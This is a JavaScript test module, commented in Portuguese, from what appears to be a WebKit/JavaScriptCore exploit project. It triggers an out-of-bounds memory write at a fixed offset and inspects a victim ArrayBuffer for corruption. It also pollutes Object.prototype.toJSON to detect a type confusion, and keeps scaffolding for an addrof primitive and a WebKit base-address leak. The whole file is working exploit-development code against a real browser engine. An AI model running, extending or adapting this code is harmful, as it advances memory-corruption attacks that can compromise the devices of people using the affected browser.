// js/script3/testArrayBufferVictimCrash.mjs (R43L - Análise Pós-OOB do Buffer Vítima)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    arb_read, // Manter para futura tentativa de WebKitLeak se conseguirmos addrof de outra forma
    oob_write_absolute,
    isOOBReady,
    selfTestOOBReadWrite,
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R43_PostOOBVictimAnalysis";

const VICTIM_BUFFER_SIZE = 256; // Pode ser aumentado para ver mais dados
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE = 0x7C;
const OOB_WRITE_VALUES_V82 = [0xABABABAB, 0xCDCDCDCD, 0x12345678]; // Testar alguns valores OOB

const FILL_PATTERN_POST_OOB_ANALYSIS = 0xDEADBEEF; // Um padrão diferente para o buffer vítima
const PROBE_CALL_LIMIT_V82 = 10; // Para a sonda de TC

// Offsets para WebKit Leak (mantidos caso consigamos addrof por outros meios)
const FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE = new AdvancedInt64(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET);
const ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL = 0x8;
const EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM = new AdvancedInt64(ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL);

let targetFunctionForLeak; // Ainda necessário para a estrutura do WebKitLeak
let leaked_target_function_addr = null; // Resetado a cada iteração

// isValidPointer (sem alterações)
function isValidPointer(ptr, context = "") {
    if (!isAdvancedInt64Object(ptr)) {
        logS3(`[isValidPointer-${context}] Input não é AdvancedInt64Object: ${String(ptr)}`, "debug_detail");
        return false;
    }
    const high = ptr.high();
    const low = ptr.low();
    if (high === 0 && low === 0) return false;
    if (high === 0x7FF80000 && low === 0x0) return false;
    if ((high & 0x7FF00000) === 0x7FF00000 && ((high & 0x000FFFFF) !== 0 || low !== 0)) return false;
    if (high === 0 && low < 0x10000) return false;
    return true;
}


export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Análise Pós-OOB do Buffer Vítima ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_CURRENT_TEST_BASE} Init PostOOB...`;

    targetFunctionForLeak = function someUniqueLeakFunctionR43L_PostOOB() { return `target_R43L_PostOOB_${Date.now()}`; };
    logS3(`Função alvo para addrof (targetFunctionForLeak) definida.`, 'info');

    logS3(`--- Fase 0 (PostOOB): Sanity Checks do Core Exploit ---`, "subtest", FNAME_CURRENT_TEST_BASE);
    let coreOOBReadWriteOK = false;
    try {
        coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3);
        logS3(`Sanity Check (selfTestOOBReadWrite): ${coreOOBReadWriteOK ? 'SUCESSO' : 'FALHA'}`, coreOOBReadWriteOK ? 'good' : 'critical', FNAME_CURRENT_TEST_BASE);
    } catch (e_sanity) {
        logS3(`Erro durante Sanity Checks: ${e_sanity.message}`, "critical", FNAME_CURRENT_TEST_BASE);
        coreOOBReadWriteOK = false;
    }
    await PAUSE_S3(100);

    if (!coreOOBReadWriteOK) {
        logS3(`Sanity check OOB falhou. Abortando ${FNAME_CURRENT_TEST_BASE}.`, "critical", FNAME_CURRENT_TEST_BASE);
        document.title = `${FNAME_CURRENT_TEST_BASE} OOB Sanity Fail!`;
        return { /* ... estrutura de erro ... */ errorOccurred: "OOB Sanity Check Failed", tc_probe_details: null, stringifyResult: null, addrof_result: { success: false, msg: "Addrof (PostOOB): Not run due to OOB Sanity Fail.", leaked_object_addr: null, leaked_object_addr_candidate_str: null }, webkit_leak_result: { success: false, msg: "WebKit Leak (PostOOB): Not run due to OOB Sanity Fail.", webkit_base_candidate: null, internal_ptr_stage1: null, internal_ptr_stage2: null }, iteration_results_summary: [], total_probe_calls_last_iter: 0, oob_value_of_best_result: null, heisenbug_on_M2_in_best_result: false};
    }

    let iteration_results_summary = [];
    let best_result_for_runner = {
        errorOccurred: null, tc_probe_details: null, stringifyResult: null,
        addrof_result: { success: false, msg: "Addrof (PostOOB): Não tentado nesta versão.", leaked_object_addr: null, leaked_object_addr_candidate_str: null }, // Addrof via getter não é o foco aqui
        webkit_leak_result: { success: false, msg: "WebKit Leak (PostOOB): Não tentado sem addrof.", webkit_base_candidate: null, internal_ptr_stage1: null, internal_ptr_stage2: null },
        oob_value_of_best_result: null,
        heisenbug_on_M2_confirmed_by_tc_probe: false, // TC ainda será verificado
        post_oob_victim_buffer_analysis: null // Novo campo para resultados da análise
    };
    let final_probe_call_count_for_report = 0;

    for (const current_oob_value of OOB_WRITE_VALUES_V82) {
        leaked_target_function_addr = null; // Resetar para cada iteração
        const current_oob_hex_val = toHex(current_oob_value);
        const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_OOB${current_oob_hex_val}`;
        logS3(`\n===== ITERATION PostOOB: OOB Write Value: ${current_oob_hex_val} (Raw: ${current_oob_value}) =====`, "subtest", FNAME_CURRENT_ITERATION);
        document.title = `${FNAME_CURRENT_TEST_BASE} Testing Val:${current_oob_hex_val}`;

        let victim_typed_array_ref_iter = null;
        let iter_post_oob_analysis_details = {
            buffer_initial_head: [],
            buffer_fill_pattern_found: false,
            buffer_size: VICTIM_BUFFER_SIZE,
            notes: ""
        };

        // --- Seção da Sonda de Type Confusion (mantida para verificar se o Heisenbug ainda ocorre) ---
        let probe_call_count_iter = 0;
        let marker_M1_ref_iter = null; let marker_M2_ref_iter = null;
        let iteration_final_tc_details_from_probe = null;
        let iteration_tc_first_detection_done = false;
        let heisenbugConfirmedThisIter = false;

        function toJSON_TA_Probe_Iter_Closure_PostOOB() {
            probe_call_count_iter++; const call_num = probe_call_count_iter;
            const ctts = Object.prototype.toString.call(this);
            const is_m2c = (this === marker_M2_ref_iter && marker_M2_ref_iter !== null && ctts === '[object Object]');

            try {
                if (call_num > PROBE_CALL_LIMIT_V82) return { r_stop: "limit" };
                if (call_num === 1 && this === victim_typed_array_ref_iter) { // victim_typed_array_ref_iter será definido mais tarde
                    marker_M2_ref_iter = { marker_id_post_oob: "M2_Iter_PostOOB" };
                    marker_M1_ref_iter = { marker_id_post_oob: "M1_Iter_PostOOB", payload_M2: marker_M2_ref_iter };
                    logS3(`[PROBE_PostOOB] Call #${call_num}: 'this' é victim_typed_array. M1/M2 criados.`, "debug");
                    return marker_M1_ref_iter;
                } else if (is_m2c) {
                    if (!iteration_tc_first_detection_done) {
                        iteration_tc_first_detection_done = true;
                        heisenbugConfirmedThisIter = true; // Marcar confirmação de TC
                        iteration_final_tc_details_from_probe = {
                            call_number_tc_detected: call_num, probe_variant: "TA_Probe_PostOOB", this_type: ctts,
                            this_is_M2: true, notes: "TC Confirmada. Addrof via getter não será tentado."
                        };
                        logS3(`[PROBE_PostOOB] Call #${call_num} (M2C): FIRST TC. ID:${this.marker_id_post_oob}.`, "vuln");
                    }
                    // Não definir getter, pois o addrof via getter falhou consistentemente
                    return this;
                }
            } catch (e_pm) {
                 iteration_final_tc_details_from_probe = { error_probe: `ProbeMainErr:${e_pm.message}` };
                 console.error("[PROBE_PostOOB] Erro principal na sonda:", e_pm);
                 return { err_pm: call_num, msg: e_pm.message };
            }
            return { gen_m: call_num, type: ctts };
        }
        // --- Fim Seção da Sonda de Type Confusion ---

        let iter_primary_error = null;
        let iter_raw_stringify_output = null;
        let iter_stringify_output_parsed = null;

        try {
            logS3(`  --- Fase 1 (PostOOB): Escrita OOB e Análise do Buffer Vítima (Val: ${current_oob_hex_val}) ---`, "subtest", FNAME_CURRENT_ITERATION);
            await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_ITERATION}-OOBSetup` });
            oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE, current_oob_value, 4); // 4 bytes = 32 bits
            logS3(`   OOB Write: Escrito valor ${current_oob_hex_val} no offset ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE)}`, 'info');
            await PAUSE_S3(50); // Pausa curta para efeitos da escrita OOB

            // Alocar o buffer vítima *após* a escrita OOB
            // O tamanho do buffer pode ser aumentado se quisermos ler mais
            const victim_buffer = new ArrayBuffer(VICTIM_BUFFER_SIZE);
            victim_typed_array_ref_iter = new Uint32Array(victim_buffer); // Usar Uint32Array para preencher e ler
            
            // Preencher com um padrão conhecido para ver se ele persiste ou se é sobrescrito
            victim_typed_array_ref_iter.fill(FILL_PATTERN_POST_OOB_ANALYSIS);
            logS3(`   Victim ArrayBuffer (size ${VICTIM_BUFFER_SIZE}) criado e preenchido com padrão 0x${FILL_PATTERN_POST_OOB_ANALYSIS.toString(16)}.`, 'debug_detail');
            
            await PAUSE_S3(100); // Outra pausa para estabilização, se necessário

            // Análise do conteúdo do buffer vítima
            logS3(`   Analisando conteúdo do victim_buffer (primeiros 64 bytes):`, 'info_emphasis');
            let temp_uint8_view = new Uint8Array(victim_buffer, 0, Math.min(64, VICTIM_BUFFER_SIZE));
            let found_pattern = true;
            let non_pattern_count = 0;
            for (let i = 0; i < temp_uint8_view.length / 4; i++) {
                let val = victim_typed_array_ref_iter[i]; // Ler como Uint32
                iter_post_oob_analysis_details.buffer_initial_head.push(val);
                if (val !== FILL_PATTERN_POST_OOB_ANALYSIS) {
                    found_pattern = false;
                    non_pattern_count++;
                }
                if (i < 16) { // Logar apenas os primeiros 16x Uint32 (64 bytes)
                    logS3(`     victim_buffer[${i*4}] (U32 idx ${i}): 0x${val.toString(16)} ${val === FILL_PATTERN_POST_OOB_ANALYSIS ? "" : "<- DIFERENTE!"}`, 'leak_detail');
                }
            }
            iter_post_oob_analysis_details.buffer_fill_pattern_found = found_pattern;
            if (found_pattern) {
                iter_post_oob_analysis_details.notes = "Padrão de preenchimento encontrado em toda a porção lida.";
                logS3(`   Análise: Padrão de preenchimento 0x${FILL_PATTERN_POST_OOB_ANALYSIS.toString(16)} encontrado consistentemente nos primeiros ${temp_uint8_view.length} bytes.`, 'good');
            } else {
                iter_post_oob_analysis_details.notes = `Padrão de preenchimento NÃO encontrado em ${non_pattern_count} posições (Uint32). Buffer pode ter sido corrompido ou não inicializado como esperado.`;
                logS3(`   Análise: Padrão de preenchimento 0x${FILL_PATTERN_POST_OOB_ANALYSIS.toString(16)} NÃO encontrado em ${non_pattern_count} posições (Uint32) nos primeiros ${temp_uint8_view.length} bytes.`, 'vuln_potential');
            }

            // Tentar a detecção de TC (mesmo que o addrof via getter não seja o foco)
            logS3(`  --- Tentativa de Detecção de TC (PostOOB) ---`, "subtest", FNAME_CURRENT_ITERATION);
            const ppKey = 'toJSON'; let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey); let polluted = false;
            try {
                // Usar victim_typed_array_ref_iter (que é Uint32Array) para JSON.stringify
                Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_Iter_Closure_PostOOB, writable: true, configurable: true, enumerable: false });
                polluted = true;
                iter_raw_stringify_output = JSON.stringify(victim_typed_array_ref_iter);
                try { iter_stringify_output_parsed = JSON.parse(iter_raw_stringify_output); } catch (e_p) { iter_stringify_output_parsed = { err_parse: iter_raw_stringify_output, msg: e_p.message }; }

                if (heisenbugConfirmedThisIter) {
                    logS3(`  TC Probe (PostOOB): TC on M2 CONFIRMADA.`, "vuln", FNAME_CURRENT_ITERATION);
                } else {
                    logS3(`  TC Probe (PostOOB): TC on M2 NÃO Confirmada. Details: ${JSON.stringify(iteration_final_tc_details_from_probe)}`, "warn", FNAME_CURRENT_ITERATION);
                }
            } catch (e_str) {
                if (!iter_primary_error) iter_primary_error = e_str;
                logS3(`  TC Probe (PostOOB): JSON.stringify EXCEPTION: ${e_str.message}`, "error", FNAME_CURRENT_ITERATION);
            } finally {
                if (polluted) {
                    if (origDesc) Object.defineProperty(Object.prototype, ppKey, origDesc); else delete Object.prototype[ppKey];
                }
            }
            logS3(`  --- Análise Pós-OOB Concluída. TC M2: ${heisenbugConfirmedThisIter} ---`, "subtest", FNAME_CURRENT_ITERATION);

        } catch (e_outer_iter) {
            if (!iter_primary_error) iter_primary_error = e_outer_iter;
            logS3(`  CRITICAL ERROR ITERATION PostOOB (Val:${current_oob_hex_val}): ${e_outer_iter.message || String(e_outer_iter)}`, "critical", FNAME_CURRENT_ITERATION);
        } finally {
            await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_ITERATION}-FinalClearPostOOB` });
        }

        final_probe_call_count_for_report = probe_call_count_iter;

        let current_iter_summary = {
            oob_value: current_oob_hex_val,
            raw_oob_value: current_oob_value,
            error: iter_primary_error ? (iter_primary_error.message || String(iter_primary_error)) : null,
            tc_probe_details: iteration_final_tc_details_from_probe,
            stringifyResult: iter_stringify_output_parsed,
            post_oob_victim_buffer_analysis: iter_post_oob_analysis_details, // Adicionar detalhes da análise
            // Addrof e WebKitLeak não são o foco principal desta versão, manter estrutura para compatibilidade
            addrof_result_this_iter: { success: false, msg: "Addrof (PostOOB): Não tentado.", leaked_object_addr: null, leaked_object_addr_candidate_str: null },
            webkit_leak_result_this_iter: { success: false, msg: "WebKit Leak (PostOOB): Não tentado.", webkit_base_candidate: null, internal_ptr_stage1: null, internal_ptr_stage2: null },
            heisenbug_on_M2_confirmed_by_tc_probe: heisenbugConfirmedThisIter
        };
        iteration_results_summary.push(current_iter_summary);

        // Lógica de best_result_for_runner (priorizar TC e análise de buffer que mostra corrupção)
        if (current_iter_summary.error === null) {
            let current_is_better_than_best = false;
            if (best_result_for_runner.errorOccurred !== null || best_result_for_runner.oob_value_of_best_result === null) {
                current_is_better_than_best = true;
            } else {
                // Prioridade: TC confirmada E buffer corrompido > TC confirmada > Buffer corrompido
                const score = (current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe ? 2 : 0) +
                              (!current_iter_summary.post_oob_victim_buffer_analysis.buffer_fill_pattern_found ? 1 : 0);
                const best_score = (best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe ? 2 : 0) +
                                   (best_result_for_runner.post_oob_victim_buffer_analysis && !best_result_for_runner.post_oob_victim_buffer_analysis.buffer_fill_pattern_found ? 1 : 0);
                if (score > best_score) {
                    current_is_better_than_best = true;
                }
            }

            if (current_is_better_than_best) {
                best_result_for_runner = {
                    errorOccurred: null,
                    tc_probe_details: current_iter_summary.tc_probe_details,
                    stringifyResult: current_iter_summary.stringifyResult,
                    addrof_result: current_iter_summary.addrof_result_this_iter, // Manter estrutura
                    webkit_leak_result: current_iter_summary.webkit_leak_result_this_iter, // Manter estrutura
                    oob_value_of_best_result: current_iter_summary.oob_value,
                    heisenbug_on_M2_confirmed_by_tc_probe: current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe,
                    post_oob_victim_buffer_analysis: current_iter_summary.post_oob_victim_buffer_analysis
                };
            }
        } else if (best_result_for_runner.oob_value_of_best_result === null && current_oob_value === OOB_WRITE_VALUES_V82[OOB_WRITE_VALUES_V82.length - 1]) {
            // Se todos falharam, pegar o último
            best_result_for_runner = { ...current_iter_summary, oob_value_of_best_result: current_iter_summary.oob_value };
        }

        if (heisenbugConfirmedThisIter && !iter_post_oob_analysis_details.buffer_fill_pattern_found) {
            document.title = `${FNAME_CURRENT_TEST_BASE}_R43L: TC & Buffer Corrupt!`;
        } else if (heisenbugConfirmedThisIter) {
            document.title = `${FNAME_CURRENT_TEST_BASE}_R43L: TC OK`;
        } else if (!iter_post_oob_analysis_details.buffer_fill_pattern_found) {
            document.title = `${FNAME_CURRENT_TEST_BASE}_R43L: Buffer Corrupt`;
        } else {
            document.title = `${FNAME_CURRENT_TEST_BASE}_R43L: Iter Done (${current_oob_hex_val})`;
        }
        await PAUSE_S3(100);
    } // Fim do loop OOB_WRITE_VALUES_V82

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
    logS3(`Best/Final result (PostOOB Analysis): ${JSON.stringify(best_result_for_runner, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);

    // Atualizar título final
    let final_title_status = "No Success";
    if (best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe && best_result_for_runner.post_oob_victim_buffer_analysis && !best_result_for_runner.post_oob_victim_buffer_analysis.buffer_fill_pattern_found) {
        final_title_status = "TC & Buffer Corrupt!";
    } else if (best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe) {
        final_title_status = "TC OK";
    } else if (best_result_for_runner.post_oob_victim_buffer_analysis && !best_result_for_runner.post_oob_victim_buffer_analysis.buffer_fill_pattern_found) {
        final_title_status = "Buffer Corrupt";
    } else if (best_result_for_runner.errorOccurred) {
        final_title_status = `Error - ${best_result_for_runner.errorOccurred}`;
    }
    document.title = `${FNAME_CURRENT_TEST_BASE}_R43L_Final: ${final_title_status}`;

    return { // Manter estrutura compatível com runner
        errorOccurred: best_result_for_runner.errorOccurred,
        tc_probe_details: best_result_for_runner.tc_probe_details,
        stringifyResult: best_result_for_runner.stringifyResult,
        addrof_result: best_result_for_runner.addrof_result, // Será default/falha
        webkit_leak_result: best_result_for_runner.webkit_leak_result, // Será default/falha
        iteration_results_summary: iteration_results_summary,
        total_probe_calls_last_iter: final_probe_call_count_for_report,
        oob_value_of_best_result: best_result_for_runner.oob_value_of_best_result,
        heisenbug_on_M2_in_best_result: best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe,
        // Incluir o novo campo no retorno principal também, se o runner for adaptado
        // post_oob_victim_buffer_analysis_best_result: best_result_for_runner.post_oob_victim_buffer_analysis
    };
}
